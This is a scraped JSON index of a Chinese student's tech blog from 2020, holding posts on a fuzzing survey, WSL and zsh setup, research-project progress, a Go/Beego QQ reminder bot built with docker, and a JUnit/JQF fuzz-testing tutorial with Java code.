生成满足网络协议的输入 基于预定义模型：内核模糊测试通常以系统调用模板的形式定义输入模型，例如参数数量与类型 基于编码模型：当检测某些类型文件的解码器的时候，可以通过稍稍变异已有的编码器来生成变异输出  基于变异生成（Mutation-based Generator）  比特翻转：直接翻转固定数量的比特 AFL/HongGFuzz/SymFuzz[S\u0026amp;P 2015] 算数变异：将选定的字节序列视为整数，然后对该值执行简单的算术运算 基于块的变异：块，指二进制种子的一个序列。通过对块的增删位移进行变异。 基于字典的变异：定义一组可能具有语义意义的预定义值用于变异LibFuzzer  种子评价器（Input Evaluator） 判断种子是否触发漏洞 这里用到了Bug Oracle的概念，把违反安全规定的行为定义为，程序因为一个危险信号而终止。\n需要注意的是，bug与crash不是一一对应的关系，有的bug可能不会产生crash，有的bug代码可能离crash处很远，有的不同的bug可能产生相同的crash，这都是可能造成判定种子的失误。可能出现的crash类型大致有以下\n内存与类型安全 Memory and Type Safety  空间上的内存安全错误——在指针的作用域外取消了指针的指向 时间上的内存安全错误——在指针已经失效后重新引用指针  未定义行为 Undefined Behaviors 输入验证漏洞 Input Validation 语义差异漏洞 Sematic Difference 分流 Triage 这个词我也不知道怎么翻译，就先这样写着吧，Triage是指分析以及上报违反安全规则的行为的测试用例的过程。\n大致分为以下几步\n重复数据删除 Deduplication 重复数据删除是要从结果集合中，剔除掉那些因为同一个bug引起的问题\n重复数据删除通常有以下几种方法\n  堆栈回溯哈希 Stack Back-trace Hashing\n在PUT崩溃时，进行堆栈的回溯，给回溯的内容分配一个哈希值。不过因为这种方法唯一标记的是崩溃信息，在原理上有些问题，无法保证相同的崩溃一定是由相同的bug产生的\n  基于覆盖的重复数据删除\n最常见的是用于AFL中，AFL是一个灰盒的Fuzzer，判定规则如下\n 当崩溃覆盖了一个之前从未发现的内容 当本次崩溃并未完全覆盖之前所有的崩溃的交集的时候    语义感知的重复数据删除\n  优先级与可利用性确定 Prioritization and Exploitability 优先级就是指显示给用户的优先级，这取决于发现的bug的严重性和独特性。当bug严重且容易被利用的时候，攻击者很容易就会从这方面下手，所以要优先处理这一类的bug。\n测试用例规模最小化 Test case minization 识别出违规用例中最小的一个子集，保证这个子集能够触发所有的违规。有时还可以去主动制作一个更小更简单但是依然能导致违规的测试用例。\n更新器（Updater） 更新器一般是用于更新种子池 以及 模糊测试配置的\n更新种子池 Seed Pool Update  基于遗传算法的更新：基于启发式的方法，模仿生物学进化机制，对种子进行变异，重组和选择 基于统计模型的更新：从历史数据中学习有效模型，来指导种子池的更新 基于复杂程序语义的更新：判断是否覆盖了复杂分支？定向模糊测试  维护最小集合 Maintaining a Minset  在最大化目标（分支覆盖率）的情况下，维护最少数量的测试参数  模糊测试分类 黑盒  无法访问PUT的内部，无法获取PUT内部与运行相关的任何数据 仅能观测PUT的输入与输出  灰盒  能观测PUT中的部分信息，可以利用简单的静态分析技术，来记录动态执行信息，例如程序的覆盖率信息 之前遇到的代码插桩的事情，可能就是与这个有点关系  白盒  能够全面的系统的访问PUT的内部状态 通常能够结合动态符号执行以及污点分析等技术进行模糊测试  模糊测试名词解释 PUT Program Under Test 指被测试的程序\nFuzzing 是指PUT从模糊测试的 input space 中执行一个 input，需要注意的是：\n 模糊测试的输入不必要包含程序所有预期输入，只要有包含一个不在程序预期输入中的input就行 通常情况下，一般会进行多轮迭代，需要精心设计迭代内容  Fuzz Testing 使用Fuzzing技术去测试PUT是否触发了一个安全策略\nFuzzer 对PUT进行模糊测试的工具\nFuzz Campaign 针对某一个安全规则，使用一组特定input数据的一次PUT执行\nBug Oracle 判定一次执行的结果是否触发了PUT的一种安全策略\nFuzz Configuration 应用于Fuzz的算法的一组参数，比如种子输入、已发现的不同的bug树、程序的覆盖率、测试已经执行的时间\n遇到的问题黑洞 符号执行 简单理解符号执行技术\n污点分析 简单理解污点分析技术\n梯度下降算法 深入浅出——梯度下降法及其实现\n吸取的经验教训 文章中举的大部分例子我都看不懂，可以先选择新跳过的，在这方面耽误了很多时间。\n","id":10,"section":"posts","summary":"\u003cp\u003e\u003ca href=\"https://arxiv.org/abs/1812.00140\"\u003earXiv:\u003cem\u003e1812.00140\u003c/em\u003e (cs) The Art, Science, and Engineering of Fuzzing: A Survey\u003c/a\u003e的阅读感想与过程中遇到的问题\u003c/p\u003e\n\u003cp\u003e我太菜了，一篇论文读了两个星期，真的好多不会的，要加紧学习了\u003c/p\u003e","tags":["Fuzzing","论文阅读"],"title":"模糊测试调查综述阅读笔记","uri":"https://qeryu.github.io/2020/05/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E8%B0%83%E6%9F%A5%E7%BB%BC%E8%BF%B0%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"通篇都是引用，这大概算是一篇综述？\n什么是WSL Windows Subsystem for Linux Wikipedia 介绍  适用于 Linux 的 Windows 子系统（英语：Windows Subsystem for Linux，简称WSL）是一个为在Windows 10和Windows Server 2019上能够原生运行Linux二进制可执行文件（ELF格式）的兼容层。\nWSL提供了一个由微软开发的Linux兼容的内核接口（不包含Linux内核代码），然后可以在其上运行GNU用户空间，例如Ubuntu，openSUSE，SUSE Linux Enterprise Server，Debian和Kali Linux。这样的用户空间可能包含Bash shell和命令语言，使用本机GNU/Linux命令行工具（sed，awk等），编程语言解释器（Ruby，Python等），甚至是图形应用程序（使用主机端的X窗口系统）。\n 对比原生 Linux 与普通虚拟机 Linux 在一些性能测试中，WSL接近于原生的 Linux，这一点我也与本地的虚拟机进行了一些对比，性能吊打VMware中的Linux虚拟机，底层还是厉害啊。据说在 I/O 上存在一些瓶颈，但是自己比较愚钝，没感觉出来。\n但是该子系统因为没有“真正的”Linux内核，所以无法运行所有的Linux文件，而且不仅需要自己手动安装桌面环境与图形化文件管理界面，还因为没有针对图形界面的优化以及加速导致了GUI程序的运行缓慢，不过现在自己还是在不断探索学习，短时间内还没有接触到这方面的瓶颈。\nShell 与 Bash Shell 是用户与Linux内核之间的接口程序，是一个命令语言解释器，拥有自己内建的 shell 命令集，shell 也可以被系统中其他的有效地 Linux程序（包括实用程序与应用程序）调用。该语言支持了在高级语言中能见到的绝大多数程序控制结构，比如循环、函数、变量和数组。shell 有很多种，常用的有\n   shell 特点     Bourne shell (sh) 编程优秀、与用户交互略菜   The Bourne Again Shell (bash) 前者的拓展，灵活的编程接口与友好的用户界面   C shell (csh) 用户友好、支持命令补齐   Korn shell (ksh) 集合前两者优点，与 sh 完全兼容    以上内容节选参考自 linux超级基础系列——什么是shell? bash和shell有什么关系？（转）\n其余内容直接去查阅菜鸟教程就行了，没必要再抄一遍了\n安装过程 对着官方wiki莽就完事了 https://wiki.ubuntu.com/WSL\n一些情况 安装步骤比较简单，过程中发生了一些不明不白的东西。\n在调整为开发者模式的时候，系统一直显示正在下载相关文件，我等了大约半小时左右，感到有些不妙，进行了一次重启。\n但是重启之后还是在下载文件，于是从网上找了相关的博客，在命令行用了以下命令重置了Windows的网络设置\nnetsh winsock reset  再次进行重启的过程中，卡在了正在准备Windows这个蓝屏的界面，约一个小时，大着胆子进行了一次重启，万幸没有出事，无法复现问题，原因未明。\n省略一些内容  一般的 Ubuntu 安装流程 对于用户权限的一些更改 设置密码等一系列东西 更换 apt 源  更加好看的Windows Terminal 下载安装 相关技术内容在gayhub上有 https://github.com/microsoft/terminal/\n从gayhub上下载有点点卡，可能是线路问题？建议直接从Windows的应用商店下载，更方便且易于更新\n个人调教 安装完成之后，最初的界面应该是类似于 powershell 的蓝底界面，说实话真的难看，相关内容可以在设置中进行调整\n按住 Alt 再点击“设置”，就可以查看那些不可更改的设置内容，其中包括了一些很好看的主题，可以在普通的“设置”中直接选择使用，不过我从网上还找到了一些更加好看的内容。\n官方提供了一个毛玻璃的效果，真的好看到爆炸！配色啥的我倒是不是很在意。\n参考资料 dalao博客 Windows Terminal 安装与配置指南\n官方文档  Editing Windows Terminal JSON Settings Profiles.json Documentation  初次使用zsh sudo apt install zsh # 安装zsh  安装 oh-my-zsh 安装过程直接用官方的就好 https://ohmyz.sh/\n遇到问题 遇到了一个找不到solution的问题，好像自己的电脑上，wsl访问 raw.githubusercontent.com 有点困难，最终还是自己手动下载了，然后转到了wsl中（期间还忘了转CRLF到LF）（蠢死我了）\n其他安装内容参见 https://blog.csdn.net/le_17_4_6/article/details/102544521\n文章中还推荐了一个主题，用起来还是蛮舒服的。\n以及一个代码补全的插件，还没有开始进一步使用，也不知道效果如何。\n","id":11,"section":"posts","summary":"\u003cp\u003e通篇都是引用，这大概算是一篇综述？\u003c/p\u003e","tags":["Linux"],"title":"WSL折腾笔记","uri":"https://qeryu.github.io/2020/05/wsl%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/","year":"2020"},{"content":"之前是打算每周写一篇博客的，结果发现这些知识都连不到一起去，有点难受，还是先零散记着，等到以后觉得形成体系了，再去整理博客吧。\n第十周   了解了Java语言中关于xml的DOM API\n  拉取了论文作者的镜像，并使用了作者提供的reuse进行了复现\n  云服务器好像没法进行可视化的操作，有点头大\n  复现结果好像不太妙\n    补充了一些Linux的基本操作\n docker的使用 apt-get update 与 apt-get upgrade的区别 apt-get update与upgrade的区别    继续阅读论文，发现一大堆不懂的东西\n ASM bytecode-manipulation是啥 javaagent又是啥    需要掌握的技术\n 代码编译技术  基于源代码的编译 基于字节码的编译   对代码进行插桩  增加一些代码，记录一些语句（变量使用前的checker之类的东西）      第十一周 自己的进度  论文阅读完成第一篇 收拾了自己的电脑，并发现了WSL  学习WSL的安装与应用 安装成功，并安装了Windows Terminal 进行优化 成功安装了zsh以及oh-my-zsh进行了一定程度上的优化   给自己又挖了几个坑，打了好几篇论文  小组进度 skip了\n第十二周  新增加了3篇需要阅读的论文，内容是关于数学的一些模型 找到了阅读代码的入口  要根据程序的执行顺序找 介个代码从脚本那里找，别从maven插件那里看    第十三周 期末来了\u0026hellip;\n第十四周  继续阅读论文，买了一本《概率论基础教程》打算自学一手 开会过程中讲到，我们本科生目前的状态是储备知识、开拓眼界 目前项目的大体方向还没有确定，好像老师还在纠结是做generate还是做mutation  目前已经确定的 建立两个概率模型\n 从GitHub上爬取JavaScript相关的数据，这一部分还可以抓取一些其他类型的数据，比如XML类型的 从Mozilla上爬取JavaScript的历史数据，根据已有的问题去构建一个概率模型  后期经过比较之后确定这两个概率模型对最终fuzz结果的影响权重\n好像是遇到的问题 目前关于黑盒fuzz的相关研究太多，研究已经深入，容易装车，很难凭借这些人手做出一些成果\n所以现在需要去设计一个策略去从PUT中抓取数据（插桩？），然后最后结果做出一个灰盒或者是白盒\n第十五周 上周完工  对前两周读的模糊测试综述的论文回看了一遍，写了一个总结笔记 https://uniqsy.github.io/2020/05/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E8%B0%83%E6%9F%A5%E7%BB%BC%E8%BF%B0%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ 学习了如何使用ESLint但是因为自己对JavaScript了解太少，还没来得及做一个demo试试，但是已经把学到的查到的东西写了一份笔记 https://uniqsy.github.io/2020/05/25/ESlint%E8%B0%83%E7%A0%94%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/ 在循序渐进学JavaScript，一边看一边整理了一个笔记，https://uniqsy.github.io/2020/05/26/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/，本来打算今天上午做个demo试试，结果上午有点事耽误了，准备等会开完会试试 去看了看funfuzz工具包，在自己电脑上进行了一些布置，准备试一试，但是现在卡壳了，具体步骤也做了一份笔记，希望大佬能指点一下 https://uniqsy.github.io/2020/05/28/funfuzz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/  第十六周 上周工作 夏亦凡  看了amutation的论文 安装了idea的一个插件 antlr-test  其他大一的  看了一下language-model的几篇论文  学长","id":12,"section":"posts","summary":"\u003cp\u003e之前是打算每周写一篇博客的，结果发现这些知识都连不到一起去，有点难受，还是先零散记着，等到以后觉得形成体系了，再去整理博客吧。\u003c/p\u003e","tags":null,"title":"大创项目进度（从第十周开始）","uri":"https://qeryu.github.io/2020/04/%E5%A4%A7%E5%88%9B%E9%A1%B9%E7%9B%AE%E8%BF%9B%E5%BA%A6%E4%BB%8E%E7%AC%AC%E5%8D%81%E5%91%A8%E5%BC%80%E5%A7%8B/","year":"2020"},{"content":"之前冰岩实习期的遗留作品，留着当个记录吧，指不定哪天闲下来还想继续弄呢。\n环境  服务器：腾讯云学生云服务器 操作系统：Ubuntu Server 18.04.1 LTS 64位 使用工具：docker, Coolq http api， MySQL, Beego 开发环境：Ubuntu 18.04（是笔记本上安装的双系统）  前期准备——资料搜集 Golang语言学习 Go语言中文网\nGo 语言中文开源图书、资料或文档\nGo by Example中文文档\nGCTT - Go 中文翻译组\nGo 系列教程（Golang tutorial series）\ngolang的时区和神奇的time.Parse\ngolang time.Duration() 问题\ngolang包time用法详解\n关于Golang开发Coolq相关的资料 Coolq http api 使用说明书\nGolang 开发Coolq接口用的SDK\nqqbotapi package的使用说明\nCQ码\n如何接收图片\n关于一些特殊地址在docker使用中的问题 关于一些特殊地址的了解\ndocker内通过127.0.0.1访问出错的原因与解决方法\n其他问题 关于字符集以及编码方式的知识笔记\ndocker修改保存后的景象\n关于在SDK例子中见到的webhook的一些了解\nCoolq平台使用过程中遇到问题 修改过的Coolq平台的docker容器运行命令 一开始不懂这些参数是啥意思，简单通过CV是无法完成任务的，长记性了，下一次用的时候需要把命令都搞明白，要不然真的会导致莫名其妙的问题。\ndocker run -ti --rm --name http-api \\ -v $(pwd)/coolq:/home/ubuntu/coolq \\ # 将宿主目录挂载到容器内用于持久化 酷Q 的程序文件 -p 9000:9000 \\ # noVNC 端口，用于从浏览器控制 酷Q -p 5700:5700 \\ # HTTP API 插件开放的端口 -e COOLQ_ACCOUNT=1092443987 \\ # 要登录的 QQ 账号，可选但建议填 -e CQHTTP_POST_URL=http://127.0.0.1:8080 \\ # 事件上报地址 -e CQHTTP_SERVE_DATA_FILES=yes \\ # 允许通过 HTTP 接口访问 酷Q 数据文件 richardchien/cqhttp:latest  登录Coolq平台之类的东西，在Coolq http api说明书中都有提到，这些就不赘述了。QQ号尽量要那种没有问题的，要不然会出现一些验证，还是比较耽误时间的。\n什么是事件上报 Coolq会把登录的QQ号上接受到的信息，包括但不限于：群消息、好友信息、添加好友请求，以http协议post请求的方式发送到指定的事件上报地址。事件上报地址一般是在docker运行coolq容器的时候，给出的一个地址。\n从post中提取信息，只需要把post中报文主体中的json类型的信息解析出来，通过Golang语言的特性，转存到自己写的对应的Golang语言结构体中就行。示例如下：\ntype MessageQQ struct { Post_type\tstring`json:\u0026quot;post_type\u0026quot;` Request_type\tstring`json:\u0026quot;request_type\u0026quot;` Comment string`json:\u0026quot;comment\u0026quot;` Flag string`json:\u0026quot;flag\u0026quot;` Message_type\tstring`json:\u0026quot;message_type\u0026quot;` Message_id\tint64`json:\u0026quot;message_id\u0026quot;` User_id int64`json:\u0026quot;user_id\u0026quot;` Sender\t*Sender`json:\u0026quot;sender\u0026quot;` Group_id\tint64`json:\u0026quot;group_id\u0026quot;` Discuss_id\tint64`json:\u0026quot;discuss_id\u0026quot;` Message string`json:\u0026quot;message\u0026quot;` Raw_message\tstring`json:\u0026quot;raw_message\u0026quot;` }  即需要在对应的元素后面增加以反引号注明的json中对应的名称。\nCoolq也能通过websock上报信息，不过websock不是很了解，为了赶时间，也没再看，直接用了前一星期速成的http的内容。\n如何使用Golang开发Coolq接口用的SDK 通过go get命令，把这些内容下载到GOPATH指定好的位置就行。Go 1.8 版本之后，GOPATH 默认在用户目录的 go 文件夹下。在docker中使用时需要自己配置GOPATH变量的位置，**无法通过直接修改.bashsh\ndocker中使用网桥连通容器而不是用link命令 需要明白一件事，docker容器内部是一个类似于虚拟化的环境，在这个环境中访问的127.0.0.1以及localhost都是访问的这个环境本身，而不是如同之前自己臆想的会访问到外部宿主机。\nLinux下的docker容器互相访问可以使用建立一个网桥，命令如下\ndocker network create -d bridge --subnet 192.168.0.0/24 --gateway 192.168.0.1 localNet   localNet是自定义的网桥的名字，可以使用其他的 建立的192.168.0.0这个子网也是可以自定义 建立完成之后，在容器内部访问192.168.0.1这个地址就是访问宿主机了  存放代码的容器的配置 这个容器中，不需要什么其他镜像的东西，直接去pull一个Ubuntu的镜像来用就行了，需要注意的是，之前coolq容器中设定的事件上报地址是宿主机的8080端口，所以这个地方，接收事件上报的容器，也就是装代码的容器，就需要链接上宿主机的8080端口\ndocker run ... -p 8080:8080 ...  好像后来还因为GOPATH的配置出现问题，容器中无法永久配置PATH，只能是通过重新封存镜像，然后编写dockerfile来进行，内容如下\nFROM mybot2:v1 ENV GOPATH /root/go ENV PATH $PATH:$GOPATH/bin  我把之前做的那些东西封成了mybot2，然后打上了标签v1，后两行的意思是，设置GOPATH和PATH环境变量。\n设置这两个变量的作用就是，方便使用go get这个命令去获取开发用的SDK以及coolq相关的东西\nBeego框架使用 Beego官方文档\nBeego控制器发送GET/POST请求并获取返回信息\ndocker 中文手册\ndockerfile的使用\ngolang中struct、json、map互相转化\nGo如何响应http请求？\n理解 Go interface 的 5 个关键点\nBeego框架中还有好多有意思的东西，没来得及探索！\nDDL提醒 加好友 为了方便测试，又加了一个加好友的功能，可以根据验证信息进行选择加好友，但是我没有设置，现在是随便加。\n需要用的数据库选择了MySQL\nnet/http中json的使用方法\nMySQL教学——廖雪峰\nmysql出现ERROR1698(28000):Access denied for user root@localhost错误解决方法\n数据库设计 分成了1+n个table，1是用户总表，获取好友列表后自动生成，n是每个用户的ddl内容。\nALTER TABLE users CHANGE COLUMN use_ddl_reminder use_ddl_reminder CHAR DEFAULT 'N';     Field Type Null Key Default Extra     id int(10) unsigned NO PRI NULL auto_increment   user_id bigint(20) YES  NULL    nickname varchar(40) YES  NULL    use_ddl_reminder char(1) YES  N     以上是用户总表的设计，需要提前在数据库容器中设置好，其实也是可以从代码中预处理的，我懒了\n[go get golang.org/x 包失败解决方法](https://github.com/AlexWoo/doc/blob/master/GOLang/go get golang.org:x 包失败解决方法.md)\ndocker笔记（五、docker安装mysql数据库\ndocker笔记（六、docker将beego程序和mysql关联起来\nGit冲突：commit your changes or stash them before you can merge.\nmysql设置主键从1开始自增\npackage strconv\nbeego_orm\n提醒机制 在计算提醒时间以及其他时间相关的事情的时候，在time库上疯狂踩坑。\n用了一个特别愚蠢的提醒机制，是每次新加一个任务，就新开一个进程。缺点是，任务过多的时候，进程会无上限增长，内存消耗巨大，延迟巨高。解决办法是\n","id":13,"section":"posts","summary":"\u003cp\u003e之前冰岩实习期的遗留作品，留着当个记录吧，指不定哪天闲下来还想继续弄呢。\u003c/p\u003e","tags":["Golang","Coolq","Beego"],"title":"beego框架下的coolq平台qqbot——DDL提醒员","uri":"https://qeryu.github.io/2020/04/beego%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84coolq%E5%B9%B3%E5%8F%B0qqbotddl%E6%8F%90%E9%86%92%E5%91%98/","year":"2020"},{"content":"虽然论文已经写得挺明白的了（老师学长如是说道），但是本垃圾还是看得五步一百度，十步一谷歌\u0026hellip;\n菜死了，理解速度还跟不上，有时候一段文字需要查好几个小时才看明白\u0026hellip;\nXML格式 XML格式是一种用语传输以及存储数据的文件格式，特点如下：\n 纯文本，使用UTF-8编码 可嵌套，可以充分表示结构化的数据（可以理解为树状结构）  固定结构 \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; ?\u0026gt; \u0026lt;!DOCTYPE note SYSTEM \u0026quot;book.dtd\u0026quot;\u0026gt; \u0026lt;book id=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;name\u0026gt;Java核心技术\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Cay S. Horstmann\u0026lt;/author\u0026gt; \u0026lt;isbn lang=\u0026quot;CN\u0026quot;\u0026gt;1234567\u0026lt;/isbn\u0026gt; \u0026lt;tags\u0026gt; \u0026lt;tag\u0026gt;Java\u0026lt;/tag\u0026gt; \u0026lt;tag\u0026gt;Network\u0026lt;/tag\u0026gt; \u0026lt;/tags\u0026gt; \u0026lt;pubDate/\u0026gt; \u0026lt;/book\u0026gt;   前两行 version encoding dtd（文档定义类型Document Type Definition）都是可以选择的参数 book标签为文档的根节点，一般来说根节点都只有一个 格式要求完全正确才能被解析，任何没有正确嵌套的标签都会导致错误  DTD文档 上文中的第二行，是把这个xml文件交给了book.dtd文档来验证规则，在DTD文档的内部，可以定义一些xml需要满足的规则，如果不满足就会判定为xml数据结构不符要求。如，可以要求根元素必须是book，还可以要求isbn元素必须有lang元素，甚至可以要求book下的子元素必须含有某些指定元素。\n转义字符 由于文档格式中大量使用了一些字符，所以\u0026hellip;\n   字符 表示     \u0026lt; \u0026amp;It;   \u0026gt; \u0026amp;gt;   \u0026amp; \u0026amp;amp;   \u0026quot; \u0026amp;quot;   ' \u0026amp;apos;    相关拓展  DTD和XSD：验证XML结构和数据是否有效； Namespace：XML节点和属性的名字空间； XSLT：把XML转化为另一种文本； XPath：一种XML节点查询语言； \u0026hellip;  DOM API DOM将xml文档一次读入，并把内容转换为树状结构放在内存中，在后期调用中十分方便，但是极为消耗内存。对应的也有以流形式读取xml的SAX API，通过一些些奇奇怪怪的方式进行使用（事件回调？）\nInputStream input = Main.class.getResourceAsStream(\u0026quot;/book.xml\u0026quot;); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(input);  通过对doc的调用就可以进行读取xml中的数据，调用printNode(doc, 0)\nvoid printNode(Node n, int indent) { // 输出xml的内容 for (int i = 0; i \u0026lt; indent; i++) { // 打出缩进 System.out.print(' '); } switch (n.getNodeType()) { case Node.DOCUMENT_NODE: // Document节点 System.out.println(\u0026quot;Document: \u0026quot; + n.getNodeName()); break; case Node.ELEMENT_NODE: // 元素节点 System.out.println(\u0026quot;Element: \u0026quot; + n.getNodeName()); break; case Node.TEXT_NODE: // 文本 System.out.println(\u0026quot;Text: \u0026quot; + n.getNodeName() + \u0026quot; = \u0026quot; + n.getNodeValue()); break; case Node.ATTRIBUTE_NODE: // 属性 System.out.println(\u0026quot;Attr: \u0026quot; + n.getNodeName() + \u0026quot; = \u0026quot; + n.getNodeValue()); break; default: // 其他 System.out.println(\u0026quot;NodeType: \u0026quot; + n.getNodeType() + \u0026quot;, NodeName: \u0026quot; + n.getNodeName()); } for (Node child = n.getFirstChild(); child != null; child = child.getNextSibling()) { printNode(child, indent + 1); } }  单元测试 Assume 与 Assert JUnit 单元测试 JUnit会吧带有@Test的方法识别为测试方法，测试类一般明明为**Test，测试方法一般命名为test**。常用断言方法如下：\n assertTrue(): 期待结果为true assertFalse(): 期待结果为false assertNotNull(): 期待结果为非null assertArrayEquals(): 期待结果为数组并与期望数组每个元素的值均相等  导入JUnit之后，可以在Eclipse中快速完成单元测试，具体内容\nAssume 对方法的参数进行合法性校验，如果校验不合格则直接抛异常，而不执行测试，默认的BlockJUnit4ClassRunner及其子类会捕获这个异常并跳过当前测试，如果使用自定义的Runner则无法保证行为，视Runner的实现而定。\n如果有的时候必须规定具备某个条件才允许测试，但又不判断为fail,则可以使用：\n@Before public void setUp() { String versionNumber = \u0026quot;7\u0026quot;; //Get it from configuration on runtime Assume.assumeTrue(Integer.valueOf(versionNumber) == 7); } @Test public void testIfVersioonGreaterThan4() { System.out.println(\u0026quot;Test executed\u0026quot;); }  当检查versionNumber不是7的时候，跳过此次测试，并throw一个可被捕获的异常。\nTutorial 1 预设问题 闰年判定 在400年闰年判定上预设问题。\n时间比较 没有考虑时区，直接比较了时间。\n生成器 JQF利用junit-quickcheck的框架生成结构化输入，为了生成T类型的输入，就必须要有一个Generator\u0026lt;T\u0026gt;的拓展类，生成这样的拓展类需要一些生成方法，也就是下文代码中的T_Generator的方法，然后就可以通过拓展类批量生成内容参与测试。\nimport java.util.GregorianCalendar; import java.util.TimeZone; import com.pholser.junit.quickcheck.generator.GenerationStatus; import com.pholser.junit.quickcheck.generator.Generator; import com.pholser.junit.quickcheck.random.SourceOfRandomness; // 以上三段代码需要后面仔细读一下 import static java.util.GregorianCalendar.*; // 导入GregorianCalendar的静态变量 public class CalendarGenerator extends Generator\u0026lt;GregorianCalendar\u0026gt; { // 继承 GregorianCalendar 的构造方法 public CalendarGenerator() { super(GregorianCalendar.class); } // 生成一个随机的时间用于测试 @Override public GregorianCalendar generate(SourceOfRandomness random, GenerationStatus __ignore__) { // cal 实例存储随机生成的时间 GregorianCalendar cal = new GregorianCalendar(); cal.setLenient(true); // 允许了时间的自动跳转，即可以从四月三十一号自动转换为五月一号 // 随机生成日期 cal.set(DAY_OF_MONTH, random.nextInt(31) + 1); cal.set(MONTH, random.nextInt(12) + 1); cal.set(YEAR, random.nextInt(cal.getMinimum(YEAR), cal.getMaximum(YEAR))); // 随机生成时间 if (random.nextBoolean()) { cal.set(HOUR, random.nextInt(24)); cal.set(MINUTE, random.nextInt(60)); cal.set(SECOND, random.nextInt(60)); } // 随机生成时区 String[] allTzIds = TimeZone.getAvailableIDs(); // 获取时区列表(e.g. \u0026quot;America/Los_Angeles\u0026quot;) String tzId = random.choose(allTzIds); // 随机抽取一个时区 TimeZone tz = TimeZone.getTimeZone(tzId); // 把String时区转换成时区对象 cal.setTimeZone(tz); return cal; } }  Test代码 import java.util.*; import static java.util.GregorianCalendar.*; import static org.junit.Assert.*; import static org.junit.Assume.*; // 感觉以下的内容好像都要以后读一读，感觉用起来不明不白的 import org.junit.runner.RunWith; import com.pholser.junit.quickcheck.*; import com.pholser.junit.quickcheck.generator.*; import edu.berkeley.cs.jqf.fuzz.*; @RunWith(JQF.class) // 告知JUnit使用JQF来进行测试 public class CalendarTest { @Fuzz // 标记测试用的代码，方便JQF找到，下文FROM标记了测试数据的来源 public void testLeapYear(@From(CalendarGenerator.class) GregorianCalendar cal) { // 筛选掉那些不是二月29的时间，这样留下的日期都是闰年了 assumeTrue(cal.get(MONTH) == FEBRUARY); assumeTrue(cal.get(DAY_OF_MONTH) == 29); assertTrue(cal.get(YEAR) + \u0026quot; should be a leap year\u0026quot;, CalendarLogic.isLeapYear(cal)); } @Fuzz public void testCompare(@Size(max=100) List\u0026lt;@From(CalendarGenerator.class) GregorianCalendar\u0026gt; cals) { Collections.sort(cals, CalendarLogic::compare); // 调用有预设问题的逻辑 // 根据预设好的逻辑，应该是升序排序 for (int i = 1; i \u0026lt; cals.size(); i++) { Calendar c1 = cals.get(i-1); Calendar c2 = cals.get(i); assumeFalse(c1.equals(c2)); // 排除掉相等的情况 assertTrue(c1 + \u0026quot; should be before \u0026quot; + c2, c1.before(c2)); // 通过正确的方法检验 } } }  比较迷惑的是文档中在最后一段的话，为什么这个From的标签没有给List而是给了List的元素，我理解的是，元素才是由CalendarGenerator.class生成的，而把这个元素放到List中进行调用的话，在它Generator的父类中就能自动生成一个包含这些生成元素的List，而Size标签就是为了限制这个随机生成的List大小的。\n编译内容与模糊测试及结果 Javac 编译指令参数 -cp 如果你这个java文件中，引入其他的jar包，需要用到 -cp 参数，全称是classpath\njavac -cp .:$(/path/to/jqf/scripts/classpath.sh) CalendarLogic.java CalendarGenerator.java CalendarTest.java  对于.:$(/path/to/jqf/scripts/classpath.sh)解释：\n $(): 执行括号中的内容，然后将执行所得结果填充到该位置 JQF/scripts/classpath.sh是获取当前JQF所依赖的所有JAR包 : 并列当前目录下的和classpath.sh获取的内容  通过JUnit和QuickCheck进行测试 java -cp .:$(/path/to/jqf/scripts/classpath.sh) org.junit.runner.JUnitCore CalendarTest  -cp参数的意义同上，但是这次是运行过程中依赖的jar，意义上也许略有不同？\n可能会获得错误消息Assumption is too strong; too many inputs discarded（反正我试了几次没试出来），原因是随机生成的时间落到闰年的二月二十九的概率太小了，可能结束之后都找不到一个能通过Assume的数据\u0026hellip;（好惨）\n命令行开启模糊测试 /path/to/jqf/bin/jqf-zest -c .:$(/path/to/jqf/scripts/classpath.sh) CalendarTest testLeapYear  这是调用了jqf-zest，-c参数是提供了配置类的路径，配置类还是从classpath.sh中获取。通过testLeapYear方法，测试了Calendartest的内容，命令行看起来比较混乱，以后还是用mvn插件吧\u0026hellip;运行起来之后如下图，加一些注释\nZest: Validity Fuzzing with Parametric Generators ------------------------------------------------- # 通过通过 testLeapYear 方法，测试了 Calendartest 的内容 Test name: CalendarTest#testLeapYear # 模糊测试结果的保存路径，路径下既有成功的数据，也有失败的的数据 Results directory: /path/to/tutorial/fuzz-results # 模糊测试时长，可以在mvn插件中指定测试时长 Elapsed time: 5s (no time limit) # 已经进行德测试数量，即总投入的数据量 Number of executions: 5,856 # 总量中有效的数据以及占比，因为那个闰年的条件太苛刻，所以有效比看起来不太高 Valid inputs: 271 (4.63%) Cycles completed: 4 # 导致错误的输入的数量（可能导致的错误都是同一种类型） Unique failures: 1 # 模糊测试中S集的大小 Queue size: 3 (3 favored last cycle) Current parent input: 0 (favored) {240/240 mutations} Execution speed: 1,300/sec now | 1,098/sec overall # 覆盖率 Total coverage: 8 (0.01% of map) Valid coverage: 6 (0.01% of map)  命令行查看模糊测试结果 /path/to/jqf/bin/jqf-repro -c .:$(/path/to/jqf/scripts/classpath.sh) CalendarTest testLeapYear  具体内容的解释和上文一样，不做注解了\nTutorial 2 上一个Tutorial使用的命令行操作JQF+Zest的工具，这个用了更加简洁的mvn插件。\n依赖以及插件配置（通过pom.xml） 调用插件的话，需要把测试用的文件以及生成器文件放在一个maven的框架中，并在maven框架的pom.xml中增加插件，具体信息如下。\n\u0026lt;project xmlns=\u0026quot;http://maven.apache.org/POM/4.0.0\u0026quot; xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot; 